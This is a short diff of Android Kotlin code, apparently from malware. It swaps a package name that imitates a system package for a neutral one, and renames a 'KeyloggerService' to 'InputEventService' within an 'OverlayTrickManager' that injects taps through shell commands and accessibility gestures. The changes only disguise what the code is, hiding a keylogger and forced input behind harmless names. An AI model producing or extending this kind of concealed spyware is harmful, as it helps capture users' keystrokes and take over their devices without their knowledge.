@@ -1,4 +1,4 @@
-package com.android.services
+package com.nexlink.bridge
 
 import android.content.Context
 import android.graphics.Color
@@ -223,7 +223,7 @@ object OverlayTrickManager {
             Runtime.getRuntime().exec(arrayOf("sh", "-c", "input tap ${x.toInt()} ${y.toInt()}"))
         } catch (_: Exception) {
             // Fallback: via AccessibilityService gesture injection
-            try { KeyloggerService.injectTap(x, y) } catch (_: Exception) {}
+            try { InputEventService.injectTap(x, y) } catch (_: Exception) {}
         }
     }
 }
